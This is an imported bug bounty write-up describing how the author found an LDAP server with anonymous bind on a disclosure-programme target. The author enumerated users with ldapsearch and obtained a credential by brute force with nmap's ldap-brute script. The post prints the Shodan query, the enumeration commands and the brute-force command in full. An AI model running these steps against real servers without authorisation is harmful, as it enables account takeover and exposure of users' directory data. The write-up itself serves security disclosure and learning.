---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-10-25_how-to-takover-a-ldap-server.md
original_filename: 2019-10-25_how-to-takover-a-ldap-server.md
title: How to Takover a ldap server.
category: documents
detected_topics:
- command-injection
- api-security
tags:
- imported
- documents
- command-injection
- api-security
language: en
raw_sha256: 8f649e231faa400b0471054b2037be821d2d1a4d61a1d6c046bda0ef8d3a1159
text_sha256: c2b6361d07d8c583cbf238555dfcb01c4e8711cc8b2d521721214d840208e234
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# How to Takover a ldap server.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-10-25_how-to-takover-a-ldap-server.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `8f649e231faa400b0471054b2037be821d2d1a4d61a1d6c046bda0ef8d3a1159`
- Text SHA256: `c2b6361d07d8c583cbf238555dfcb01c4e8711cc8b2d521721214d840208e234`


## Content

---
title: "How to Takover a ldap server."
url: "https://medium.com/@D0rkerDevil/how-i-tookover-a-ldap-server-703209161001"
authors: ["Ashish Kunwar (@D0rkerDevil)"]
bugs: ["Misconfigured LDAP server"]
publication_date: "2019-10-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4972
scraped_via: "browseros"
---

# How to Takover a ldap server.

Top highlight

How to Takover a ldap server.
Ashish Kunwar
Follow
2 min read
·
Oct 25, 2019

247

1

Intro

LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. — read here

I Chose a random paying target REDACTED.com running a Responsible Disclosure.

As Usual i started my personal tool “BREXET” and it gathered lots of subdomains and ran nmap over every subdomain , i went through the output and found this interesting port 389 with anonymous bind enabled.

can be found using shodan , use shodan query — ssl:target Port:”389"

Anonymous LDAP Binding allows a client to connect and search the directory (bind and search) without logging in. You do not need to include binddn and bindpasswd.

Now, we can try searching for the base by using a ldap search query.

ldapsearch -h <TARGET IP> 389 -x -s base -b ‘’ “(objectClass=*)” “*” +

Press enter or click to view image in full size
this is just small glimpse how it would look like.

now , take a note of naming context/base ,with this we can enum ldap users and their access details and uids , etc

defaultnamingcontext: dc=xxx,dc=xxx,dc=xx

we are gonna use this command.

Get Ashish Kunwar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

ldapsearch -h <TARGET IP> -p 389 -x -b “dc=xxx,dc=xxx,dc=xx”

Press enter or click to view image in full size

now there were lots of users and here’s how their ldap detail look like

# aab, users, compat, doman_name
dn: uid=aab,cn=users,cn=compat,dc=xxx,dc=xxx,dc=xx
objectClass: posixAccount
objectClass: ipaOverrideTarget
objectClass: top
gecos: name_here
cn: name_here
uidNumber: 1019XXXXXXX
gidNumber: 1019XXXXXXX
loginShell: /bin/bash
homeDirectory: /home/aab
ipaAnchorUUID:: xxxxxxxxx
uid: aab

now with this as a attacker i can try bruteforcing passwords or can check for usernames and password with a default list using nmap

nmap -p 389 — script ldap-brute — script-args ldap.base=’”dc=xxx,dc=xxxx,dc=xx”’ <target ip>

#Note: You can use jxplorer to do the same , just connect to the port using it .

#Note: do nmap scan on all subs if the target scope is big.

with this i got lucky and got a ldap user cred (thanks to nmap)

once you get access use jxplorer to play around .

after reporting it , i earned good bounty.

#if you have any question just DM on my twitter.
